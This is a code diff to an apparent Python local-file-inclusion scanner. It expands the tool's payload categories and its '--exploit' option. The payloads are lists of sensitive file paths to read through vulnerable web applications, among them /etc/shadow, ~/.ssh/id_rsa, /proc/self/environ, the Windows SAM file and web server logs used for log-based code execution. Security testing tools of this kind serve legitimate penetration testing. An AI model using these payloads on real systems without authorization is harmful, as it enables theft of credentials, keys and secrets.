@@ -63,61 +63,113 @@ class LFIScanner:
             # ... full list from user input
         ]
         self.categories = {
-            # Linux
-            "linux_users": {
-            "name": "User Home Files",
+             # Linux
+        "linux_system": {
+            "name": "Core OS Files",
             "payloads": [
-                ".profile",
-            #     ".bash_history",
-            #     ".ssh/id_rsa",
-            #     ".ssh/authorized_keys",
-            #     ".mysql_history",
-            #     "Desktop/user.txt",
-            #     "Documents/secrets.txt"
+                "/etc/passwd",
+                "/etc/shadow",
+                "/proc/self/environ",
+                "/etc/hosts",
+                "/proc/version",
+                "/etc/issue"
             ]
         },
-
-            "linux_system": {
-                "name": "System Files",
-                "payloads": [
-                    "/etc/passwd",
-                    "/etc/hosts",
-                    "/proc/self/environ",
-                    "/etc/shadow",
-                    
-                    # ... your static Linux paths
-                ]
-            },
-            "linux_network": {
-                "name": "Network Info",
-                "payloads": [
-                    "/proc/net/arp",
-                    "/proc/net/tcp",
-                    # ... network paths
-                ]
-            },
-            "log_rce": {
-                "name": "Log-based RCE Detection",
-                "payloads": [
-                    '/var/log/apache2/access.log',
-                    '/var/log/nginx/access.log',
-                    '/proc/self/environ',
-                    '/var/log/sshd.log',
-                    '/var/log/mail.log'
-                ]
-            },
-           # Windows
-            "windows_common": {
-                "name": "Windows Files",
-                "payloads": [
-                    "C:\\Windows\\win.ini".replace('\\', quote('\\')),  # Proper encoding
-                    "C:\\Windows\\System32\\license.rtf".replace('\\', quote('\\')),
-                    # ... Windows paths
-                ]
-
-                
-            }
+        "linux_users": {
+            "name": "User Home Files",
+            "payloads": [
+                "~/.ssh/id_rsa",
+                "~/.bash_history",
+                "~/.bashrc",
+                "~/.profile",
+                "~/.mysql_history",
+                "~/Documents/*"
+            ]
+        },
+        "log_rce": {
+            "name": "Log-based RCE",
+            "payloads": [
+                "/var/log/apache2/access.log",
+                "/var/log/syslog",
+                "/var/log/sshd.log",
+                "/var/log/mail.log",
+                "/proc/self/environ"
+            ]
+        },
+        "web_servers": {
+            "name": "Web Server Configs",
+            "payloads": [
+                "/etc/apache2/apache2.conf",
+                "/etc/nginx/nginx.conf",
+                "/etc/httpd/conf/httpd.conf",
+                "/usr/local/nginx/conf/nginx.conf"
+            ]
+        },
+        "cron_jobs": {
+            "name": "Scheduled Tasks",
+            "payloads": [
+                "/etc/crontab",
+                "/var/spool/cron/crontabs/root",
+                "/etc/cron.d/",
+                "/etc/anacrontab"
+            ]
+        },
+        "database": {
+            "name": "Database Configs",
+            "payloads": [
+                "/etc/my.cnf",
+                "/var/lib/mysql/mysql.log",
+                "/etc/postgresql/postgresql.conf",
+                "/var/log/mysql.log"
+            ]
+        },
+        "ftp_configs": {
+            "name": "FTP Server Configs",
+            "payloads": [
+                "/etc/proftpd/proftpd.conf",
+                "/var/log/pure-ftpd.log",
+                "/etc/vsftpd.conf",
+                "/etc/pure-ftpd/pure-ftpd.conf"
+            ]
+        },
+        "ssh_keys": {
+            "name": "SSH Authentication",
+            "payloads": [
+                "~/.ssh/id_rsa",
+                "/etc/ssh/sshd_config",
+                "~/.ssh/authorized_keys",
+                "/var/log/auth.log"
+            ]
+        },
+        "boot_files": {
+            "name": "System Boot Configs",
+            "payloads": [
+                "/etc/inittab",
+                "/boot/grub/grub.cfg",
+                "/etc/default/grub",
+                "/etc/init.d/"
+            ]
+        },
+        # Windows
+        "windows_common": {
+            "name": "Windows System",
+            "payloads": [
+                "C:\\Windows\\win.ini".replace('\\', quote('\\')),
+                "C:\\Windows\\System32\\drivers\\etc\\hosts".replace('\\', quote('\\')),
+                "C:\\Windows\\repair\\SAM".replace('\\', quote('\\'))
+            ]
+        },
+        # Network
+        "linux_network": {
+            "name": "Network Info",
+            "payloads": [
+                "/proc/net/arp",
+                "/proc/net/tcp",
+                "/etc/resolv.conf",
+                "/etc/hosts.allow"
+            ]
         }
+    }
         self.payload_categories = self.categories 
 
 
@@ -928,7 +980,12 @@ def main():
     group.add_argument("-l", "--url-list", help="File containing list of URLs to test")
 
     parser.add_argument("--exploit", nargs="*",
-                        choices=["linux_users", "linux_system", "linux_network", "windows_common", "log_rce"],  # ADD log_rce
+                        choices=[
+                        "linux_system", "linux_users", "log_rce",
+                        "web_servers", "cron_jobs", "database",
+                        "ftp_configs", "ssh_keys", "boot_files",
+                        "windows_common", "linux_network"
+                    ],
                         metavar="CATEGORY",
                         help="Enable exploitation with payload categories (space-separated)")
     parser.add_argument("-w", "--wordlist", 
